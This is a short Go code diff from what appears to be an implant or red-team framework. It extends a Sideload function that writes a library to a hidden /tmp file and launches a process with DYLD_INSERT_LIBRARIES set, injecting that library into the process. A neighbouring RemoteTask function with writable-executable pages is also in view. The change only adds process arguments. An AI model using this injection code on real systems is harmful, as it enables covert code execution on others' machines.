@@ -58,11 +58,12 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 // Sideload - Side load a library and return its output
-func Sideload(procName string, data []byte, args string, kill bool) (string, error) {
+func Sideload(procName string, procArgs []string, _ uint32, data []byte, args string, kill bool) (string, error) {
 	var (
 		stdOut bytes.Buffer
 		stdErr bytes.Buffer
 		wg     sync.WaitGroup
+		cmd    *exec.Cmd
 	)
 	fdPath := fmt.Sprintf("/tmp/.%s", randomString(10))
 	err := ioutil.WriteFile(fdPath, data, 0755)
@@ -75,7 +76,11 @@ func Sideload(procName string, data []byte, args string, kill bool) (string, err
 		fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s", fdPath),
 	}
 	env = append(env, newEnv...)
-	cmd := exec.Command(procName)
+	if len(procArgs) > 0 {
+		cmd = exec.Command(procName, procArgs...)
+	} else {
+		cmd = exec.Command(procName)
+	}
 	cmd.Env = env
 	cmd.Stdout = &stdOut
 	cmd.Stderr = &stdErr
